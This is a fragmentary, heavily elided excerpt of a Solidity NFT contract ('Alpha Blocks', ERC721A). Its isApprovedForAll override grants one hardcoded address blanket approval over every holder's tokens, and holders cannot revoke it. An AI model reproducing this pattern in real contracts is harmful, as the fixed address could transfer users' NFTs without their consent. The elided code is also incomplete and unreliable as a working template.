  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x162064a7186C82766854721Aa1505a440E59a755){return true;}
...
contract Alpha_Blocks is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Alpha Blocks", "AB", maxBatchSize_, collectionSize_) {
